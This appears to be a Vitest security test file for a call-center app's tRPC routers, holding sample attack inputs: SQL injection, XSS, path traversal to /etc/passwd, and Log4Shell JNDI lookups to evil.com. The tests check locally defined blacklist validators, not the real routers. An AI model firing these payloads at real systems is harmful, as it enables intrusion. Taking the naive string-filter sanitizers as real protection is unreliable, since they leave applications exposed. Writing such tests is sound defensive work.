/**
 * tRPC Router Security Tests
 * Tests security measures across all 11 tRPC routers
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { createMockFastify, createMockRequest, createMockReply } from '../setup-simple';

// Mock tRPC context creation
const createMockContext = (overrides: any = {}) => ({
  req: createMockRequest(),
  res: createMockReply(),
  user: {
    id: 'test-user',
    email: 'test@example.com',
    role: 'AGENT',
    organizationId: 'test-org'
  },
  ...overrides
});

describe('tRPC Router Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Authentication Router Security', () => {
    it('should validate login input to prevent injection attacks', () => {
      const maliciousInputs = [
        { email: 'admin@test.com\'; DROP TABLE users; --', password: 'password' },
        { email: '<script>alert("xss")</script>', password: 'password' },
        { email: 'test@example.com', password: '${jndi:ldap://evil.com/a}' },
        { email: 'admin@test.com', password: '../../../etc/passwd' }
      ];

      for (const input of maliciousInputs) {
        const result = validateAuthInput(input);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      }
    });

    it('should enforce rate limiting on login attempts', () => {
      const rateLimiter = createAuthRateLimiter();
      const ip = '192.168.1.100';

      // Allow first few attempts
      for (let i = 0; i < 5; i++) {
        expect(rateLimiter.checkLimit(ip)).toBe(true);
      }

      // Block subsequent attempts
      for (let i = 0; i < 3; i++) {
        expect(rateLimiter.checkLimit(ip)).toBe(false);
      }
    });

    it('should validate session tokens against known formats', () => {
      const validTokens = [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
      ];

      const invalidTokens = [
        'invalid-token',
        'bearer token',
        '<script>alert(1)</script>',
        'token; path=/'
      ];

      for (const token of validTokens) {
        expect(validateSessionToken(token)).toBe(true);
      }

      for (const token of invalidTokens) {
        expect(validateSessionToken(token)).toBe(false);
      }
    });
  });

  describe('User Management Router Security', () => {
    it('should enforce role-based access control', () => {
      const testCases = [
        { userRole: 'AGENT', action: 'createUser', allowed: false },
        { userRole: 'SUPERVISOR', action: 'createUser', allowed: false },
        { userRole: 'ADMIN', action: 'createUser', allowed: true },
        { userRole: 'AGENT', action: 'updateOwnProfile', allowed: true },
        { userRole: 'AGENT', action: 'updateOtherProfile', allowed: false },
        { userRole: 'SUPERVISOR', action: 'viewTeamMembers', allowed: true },
        { userRole: 'AGENT', action: 'viewAllUsers', allowed: false }
      ];

      for (const testCase of testCases) {
        const result = checkRolePermission(testCase.userRole, testCase.action);
        expect(result).toBe(testCase.allowed);
      }
    });

    it('should validate user creation input', () => {
      const validInput = {
        email: 'newuser@example.com',
        firstName: 'John',
        lastName: 'Doe',
        role: 'AGENT',
        organizationId: 'valid-org-123'
      };

      const invalidInputs = [
        { ...validInput, email: 'invalid-email' },
        { ...validInput, role: 'SUPER_ADMIN' },
        { ...validInput, organizationId: '../../../etc/passwd' },
        { ...validInput, firstName: '<script>alert(1)</script>' }
      ];

      expect(validateUserCreateInput(validInput)).toBe(true);

      for (const input of invalidInputs) {
        expect(validateUserCreateInput(input)).toBe(false);
      }
    });

    it('should prevent privilege escalation attempts', () => {
      const escalationAttempts = [
        { currentRole: 'AGENT', targetRole: 'ADMIN' },
        { currentRole: 'SUPERVISOR', targetRole: 'ADMIN' },
        { currentRole: 'AGENT', targetRole: 'SUPERVISOR' }
      ];

      const validChanges = [
        { currentRole: 'ADMIN', targetRole: 'SUPERVISOR' },
        { currentRole: 'ADMIN', targetRole: 'AGENT' },
        { currentRole: 'SUPERVISOR', targetRole: 'AGENT' }
      ];

      for (const attempt of escalationAttempts) {
        expect(canChangeRole(attempt.currentRole, attempt.targetRole)).toBe(false);
      }

      for (const change of validChanges) {
        expect(canChangeRole(change.currentRole, change.targetRole)).toBe(true);
      }
    });
  });

  describe('Call Management Router Security', () => {
    it('should enforce organization isolation for call access', () => {
      const userOrg = 'org-123';
      const callOrg = 'org-456';

      expect(canAccessCall(userOrg, userOrg)).toBe(true);
      expect(canAccessCall(userOrg, callOrg)).toBe(false);
      expect(canAccessCall(userOrg, null)).toBe(false);
    });

    it('should validate call creation input', () => {
      const validCall = {
        fromNumber: '+1234567890',
        toNumber: '+0987654321',
        campaignId: 'campaign-123'
      };

      const invalidCalls = [
        { ...validCall, fromNumber: 'invalid-number' },
        { ...validCall, toNumber: '<script>alert(1)</script>' },
        { ...validCall, campaignId: '../../../etc/passwd' }
      ];

      expect(validateCallInput(validCall)).toBe(true);

      for (const call of invalidCalls) {
        expect(validateCallInput(call)).toBe(false);
      }
    });

    it('should sanitize call metadata and recordings', () => {
      const maliciousMetadata = {
        customerName: '<script>alert("xss")</script>',
        notes: 'javascript:alert(1)',
        recordingUrl: 'file:///etc/passwd',
        customFields: {
          malicious: '${jndi:ldap://evil.com}'
        }
      };

      const sanitized = sanitizeCallMetadata(maliciousMetadata);

      expect(sanitized.customerName).not.toContain('<script>');
      expect(sanitized.notes).not.toContain('javascript:');
      expect(sanitized.recordingUrl).not.toContain('file://');
      expect(sanitized.customFields.malicious).not.toContain('${jndi:');
    });
  });

  describe('Campaign Router Security', () => {
    it('should validate campaign configuration to prevent misuse', () => {
      const validCampaign = {
        name: 'Test Campaign',
        type: 'OUTBOUND',
        maxConcurrentCalls: 10,
        dialingRate: 5
      };

      const invalidCampaigns = [
        { ...validCampaign, maxConcurrentCalls: 1000 }, // Too high
        { ...validCampaign, dialingRate: 100 }, // Too aggressive
        { ...validCampaign, name: '<script>alert(1)</script>' },
        { ...validCampaign, type: 'MALICIOUS_TYPE' }
      ];

      expect(validateCampaignConfig(validCampaign)).toBe(true);

      for (const campaign of invalidCampaigns) {
        expect(validateCampaignConfig(campaign)).toBe(false);
      }
    });

    it('should enforce campaign execution limits', () => {
      const limits = {
        maxDailyAttempts: 1000,
        maxHourlyAttempts: 100,
        maxConcurrentCalls: 20
      };

      const currentStats = {
        dailyAttempts: 950,
        hourlyAttempts: 90,
        activeCalls: 15
      };

      expect(canExecuteCampaign(currentStats, limits)).toBe(true);

      // Test exceeding daily limit
      expect(canExecuteCampaign({ ...currentStats, dailyAttempts: 1001 }, limits)).toBe(false);

      // Test exceeding hourly limit
      expect(canExecuteCampaign({ ...currentStats, hourlyAttempts: 101 }, limits)).toBe(false);

      // Test exceeding concurrent calls
      expect(canExecuteCampaign({ ...currentStats, activeCalls: 21 }, limits)).toBe(false);
    });
  });

  describe('Webhook Router Security', () => {
    it('should validate webhook signatures', () => {
      const validSignature = 'sha256=a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3';
      const invalidSignatures = [
        'invalid-signature',
        'sha256=wrong-hash',
        '<script>alert(1)</script>',
        ''
      ];

      const payload = '{"test": "data"}';
      const secret = 'webhook-secret';

      expect(validateWebhookSignature(payload, validSignature, secret)).toBe(true);

      for (const signature of invalidSignatures) {
        expect(validateWebhookSignature(payload, signature, secret)).toBe(false);
      }
    });

    it('should enforce webhook rate limiting by IP', () => {
      const rateLimiter = createWebhookRateLimiter();
      const ip = '192.168.1.100';

      // Allow normal webhook frequency
      for (let i = 0; i < 10; i++) {
        expect(rateLimiter.checkLimit(ip)).toBe(true);
      }

      // Block excessive requests
      for (let i = 0; i < 5; i++) {
        expect(rateLimiter.checkLimit(ip)).toBe(false);
      }
    });

    it('should validate webhook payload structure', () => {
      const validPayloads = [
        { event: 'call.started', data: { callId: 'call-123' } },
        { event: 'call.ended', data: { callId: 'call-123', duration: 120 } }
      ];

      const invalidPayloads = [
        { event: 'malicious.event', data: '<script>alert(1)</script>' },
        { event: '../../../etc/passwd', data: {} },
        { event: 'call.started' }, // Missing data
        'invalid json payload'
      ];

      for (const payload of validPayloads) {
        expect(validateWebhookPayload(payload)).toBe(true);
      }

      for (const payload of invalidPayloads) {
        expect(validateWebhookPayload(payload)).toBe(false);
      }
    });
  });

  describe('Reports Router Security', () => {
    it('should enforce data access permissions for reports', () => {
      const testCases = [
        { userRole: 'AGENT', reportType: 'personal_calls', allowed: true },
        { userRole: 'AGENT', reportType: 'team_performance', allowed: false },
        { userRole: 'SUPERVISOR', reportType: 'team_performance', allowed: true },
        { userRole: 'SUPERVISOR', reportType: 'organization_stats', allowed: false },
        { userRole: 'ADMIN', reportType: 'organization_stats', allowed: true }
      ];

      for (const testCase of testCases) {
        expect(canAccessReport(testCase.userRole, testCase.reportType)).toBe(testCase.allowed);
      }
    });

    it('should validate report date ranges to prevent abuse', () => {
      const now = new Date();
      const oneDay = 24 * 60 * 60 * 1000;
      const oneYear = 365 * oneDay;

      const validRanges = [
        { start: new Date(now.getTime() - oneDay), end: now },
        { start: new Date(now.getTime() - 30 * oneDay), end: now },
        { start: new Date(now.getTime() - 90 * oneDay), end: now }
      ];

      const invalidRanges = [
        { start: new Date(now.getTime() - 5 * oneYear), end: now }, // Too far back
        { start: now, end: new Date(now.getTime() - oneDay) }, // End before start
        { start: new Date(now.getTime() + oneDay), end: now }, // Future start date
        { start: null, end: now }, // Invalid start
        { start: now, end: null } // Invalid end
      ];

      for (const range of validRanges) {
        expect(validateReportDateRange(range.start, range.end)).toBe(true);
      }

      for (const range of invalidRanges) {
        expect(validateReportDateRange(range.start as any, range.end as any)).toBe(false);
      }
    });

    it('should sanitize report filters to prevent injection', () => {
      const maliciousFilters = {
        agentName: '<script>alert("xss")</script>',
        campaign: '"; DROP TABLE campaigns; --',
        phoneNumber: '../../../etc/passwd',
        customField: '${jndi:ldap://evil.com}'
      };

      const sanitized = sanitizeReportFilters(maliciousFilters);

      expect(sanitized.agentName).not.toContain('<script>');
      expect(sanitized.campaign).not.toContain('DROP TABLE');
      expect(sanitized.phoneNumber).not.toContain('../');
      expect(sanitized.customField).not.toContain('${jndi:');
    });
  });

  describe('Settings Router Security', () => {
    it('should validate configuration changes', () => {
      const validConfigs = [
        { key: 'max_concurrent_calls', value: '10' },
        { key: 'default_timezone', value: 'UTC' },
        { key: 'session_timeout', value: '3600' }
      ];

      const invalidConfigs = [
        { key: 'admin_password', value: 'secret' }, // Sensitive key
        { key: '<script>alert(1)</script>', value: 'value' },
        { key: 'max_concurrent_calls', value: '99999' }, // Dangerous value
        { key: 'database_url', value: 'postgresql://...' } // System config
      ];

      for (const config of validConfigs) {
        expect(validateConfigChange(config.key, config.value)).toBe(true);
      }

      for (const config of invalidConfigs) {
        expect(validateConfigChange(config.key, config.value)).toBe(false);
      }
    });

    it('should enforce admin-only access for critical settings', () => {
      const criticalSettings = [
        'system_database_url',
        'encryption_keys',
        'admin_users',
        'security_config',
        'api_secrets'
      ];

      const regularSettings = [
        'user_interface_theme',
        'default_language',
        'notification_preferences',
        'display_timezone'
      ];

      for (const setting of criticalSettings) {
        expect(requiresAdminAccess(setting)).toBe(true);
      }

      for (const setting of regularSettings) {
        expect(requiresAdminAccess(setting)).toBe(false);
      }
    });
  });
});

// Helper functions for security validation
function validateAuthInput(input: any): { isValid: boolean; errors: string[] } {
  const errors: string[] = [];

  if (!input.email || typeof input.email !== 'string') {
    errors.push('Invalid email');
  } else if (input.email.includes('<script>') || input.email.includes('DROP TABLE')) {
    errors.push('Malicious email pattern detected');
  }

  if (!input.password || typeof input.password !== 'string') {
    errors.push('Invalid password');
  } else if (input.password.includes('${jndi:') || input.password.includes('../')) {
    errors.push('Malicious password pattern detected');
  }

  return { isValid: errors.length === 0, errors };
}

function createAuthRateLimiter() {
  const attempts = new Map<string, number[]>();

  return {
    checkLimit(ip: string): boolean {
      const now = Date.now();
      const windowMs = 15 * 60 * 1000; // 15 minutes
      const maxAttempts = 5;

      if (!attempts.has(ip)) {
        attempts.set(ip, []);
      }

      const ipAttempts = attempts.get(ip)!;
      const recentAttempts = ipAttempts.filter(time => now - time < windowMs);

      if (recentAttempts.length >= maxAttempts) {
        return false;
      }

      recentAttempts.push(now);
      attempts.set(ip, recentAttempts);
      return true;
    }
  };
}

function validateSessionToken(token: string): boolean {
  if (!token || typeof token !== 'string') return false;

  // Check for malicious patterns
  if (token.includes('<script>') || token.includes(';') || token.includes('\n')) {
    return false;
  }

  // Basic JWT format check
  const parts = token.split('.');
  if (parts.length !== 3) return false;

  return parts.every(part => /^[A-Za-z0-9_-]*$/.test(part));
}

function checkRolePermission(userRole: string, action: string): boolean {
  const permissions = {
    ADMIN: ['createUser', 'updateOwnProfile', 'updateOtherProfile', 'viewTeamMembers', 'viewAllUsers'],
    SUPERVISOR: ['updateOwnProfile', 'viewTeamMembers'],
    AGENT: ['updateOwnProfile']
  };

  return permissions[userRole as keyof typeof permissions]?.includes(action) || false;
}

function validateUserCreateInput(input: any): boolean {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const allowedRoles = ['AGENT', 'SUPERVISOR', 'ADMIN'];

  return emailRegex.test(input.email) &&
         allowedRoles.includes(input.role) &&
         !input.organizationId?.includes('../') &&
         !input.firstName?.includes('<script>');
}

function canChangeRole(currentRole: string, targetRole: string): boolean {
  if (currentRole === 'ADMIN') return true;
  if (currentRole === 'SUPERVISOR' && targetRole === 'AGENT') return true;
  return false;
}

function canAccessCall(userOrg: string, callOrg: string | null): boolean {
  return callOrg !== null && userOrg === callOrg;
}

function validateCallInput(call: any): boolean {
  const phoneRegex = /^\+[1-9]\d{1,14}$/;

  return phoneRegex.test(call.fromNumber) &&
         phoneRegex.test(call.toNumber) &&
         !call.campaignId?.includes('../');
}

function sanitizeCallMetadata(metadata: any): any {
  const sanitized = { ...metadata };

  for (const [key, value] of Object.entries(sanitized)) {
    if (typeof value === 'string') {
      sanitized[key] = value
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/file:\/\//gi, '')
        .replace(/\${[^}]*}/g, '');
    } else if (typeof value === 'object' && value !== null) {
      sanitized[key] = sanitizeCallMetadata(value);
    }
  }

  return sanitized;
}

function validateCampaignConfig(campaign: any): boolean {
  return campaign.maxConcurrentCalls <= 50 &&
         campaign.dialingRate <= 20 &&
         !campaign.name?.includes('<script>') &&
         ['INBOUND', 'OUTBOUND', 'BLENDED'].includes(campaign.type);
}

function canExecuteCampaign(stats: any, limits: any): boolean {
  return stats.dailyAttempts <= limits.maxDailyAttempts &&
         stats.hourlyAttempts <= limits.maxHourlyAttempts &&
         stats.activeCalls <= limits.maxConcurrentCalls;
}

function validateWebhookSignature(payload: string, signature: string, secret: string): boolean {
  const crypto = require('crypto');
  const expectedSignature = 'sha256=' + crypto.createHmac('sha256', secret).update(payload).digest('hex');
  return signature === expectedSignature;
}

function createWebhookRateLimiter() {
  const requests = new Map<string, number[]>();

  return {
    checkLimit(ip: string): boolean {
      const now = Date.now();
      const windowMs = 60 * 1000;
      const maxRequests = 10;

      if (!requests.has(ip)) {
        requests.set(ip, []);
      }

      const ipRequests = requests.get(ip)!;
      const recentRequests = ipRequests.filter(time => now - time < windowMs);

      if (recentRequests.length >= maxRequests) {
        return false;
      }

      recentRequests.push(now);
      requests.set(ip, recentRequests);
      return true;
    }
  };
}

function validateWebhookPayload(payload: any): boolean {
  if (typeof payload !== 'object' || payload === null) return false;
  if (!payload.event || typeof payload.event !== 'string') return false;
  if (payload.event.includes('../') || payload.event.includes('<script>')) return false;
  return true;
}

function canAccessReport(userRole: string, reportType: string): boolean {
  const permissions = {
    ADMIN: ['personal_calls', 'team_performance', 'organization_stats'],
    SUPERVISOR: ['personal_calls', 'team_performance'],
    AGENT: ['personal_calls']
  };

  return permissions[userRole as keyof typeof permissions]?.includes(reportType) || false;
}

function validateReportDateRange(start: Date, end: Date): boolean {
  if (!start || !end || !(start instanceof Date) || !(end instanceof Date)) return false;
  if (start >= end) return false;

  const now = new Date();
  const maxHistoryDays = 2 * 365; // 2 years
  const maxHistory = new Date(now.getTime() - maxHistoryDays * 24 * 60 * 60 * 1000);

  return start >= maxHistory && end <= now;
}

function sanitizeReportFilters(filters: any): any {
  const sanitized = { ...filters };

  for (const [key, value] of Object.entries(sanitized)) {
    if (typeof value === 'string') {
      sanitized[key] = value
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/DROP\s+TABLE/gi, '')
        .replace(/\.\.\/+/g, '')
        .replace(/\${[^}]*}/g, '');
    }
  }

  return sanitized;
}

function validateConfigChange(key: string, value: string): boolean {
  const dangerousKeys = ['admin_password', 'database_url', 'encryption_key', 'api_secret'];
  if (dangerousKeys.includes(key)) return false;

  if (key.includes('<script>') || value.includes('<script>')) return false;

  if (key === 'max_concurrent_calls' && parseInt(value) > 1000) return false;

  return true;
}

function requiresAdminAccess(setting: string): boolean {
  const adminOnlySettings = [
    'system_database_url',
    'encryption_keys',
    'admin_users',
    'security_config',
    'api_secrets'
  ];

  return adminOnlySettings.includes(setting);
}